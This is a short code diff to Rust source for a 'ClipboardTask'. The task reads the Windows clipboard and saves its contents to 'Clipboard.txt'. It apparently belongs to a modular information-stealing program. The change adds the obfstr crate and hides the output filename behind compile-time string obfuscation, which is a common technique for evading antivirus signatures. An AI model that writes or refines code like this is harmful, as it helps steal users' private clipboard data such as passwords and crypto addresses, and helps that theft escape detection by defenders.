@@ -4,6 +4,7 @@ use windows_sys::Win32::System::DataExchange::{CloseClipboard, GetClipboardData,
 use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
 use tasks::Task;
 use utils::path::{Path, WriteToFile};
+use obfstr::obfstr as s;
 
 pub(super) struct ClipboardTask;
 
@@ -42,7 +43,7 @@ impl Task for ClipboardTask {
             return;
         }
         
-        let output = parent / "Clipboard.txt";
+        let output = parent / s!("Clipboard.txt");
         let _ = str.write_to(&output);
     }
 }
